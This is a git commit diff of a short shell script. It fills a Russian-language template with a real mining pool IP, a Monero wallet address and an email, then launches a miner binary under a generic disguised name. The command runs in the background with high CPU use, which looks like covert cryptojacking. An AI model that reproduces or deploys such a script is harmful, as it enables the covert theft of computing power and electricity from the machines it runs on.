0f1c06397c3a3faa123030bb8acb80ea001c5e5d
test-best12 <58774727+test-best12@users.noreply.github.com>
2019-12-11 07:56:45 -0600

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 51.89.208.23:49228 -u 4AzJzGSwBRfcmP3dxtYTo28yhqwnKLEL9M677mrSgmRHfWaWzkkZCBtT7LzigX6voxfTcWY8CsGXS5mHmhJXmPRVNiVY9Uz --pass=x:testbest12@shuryl.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
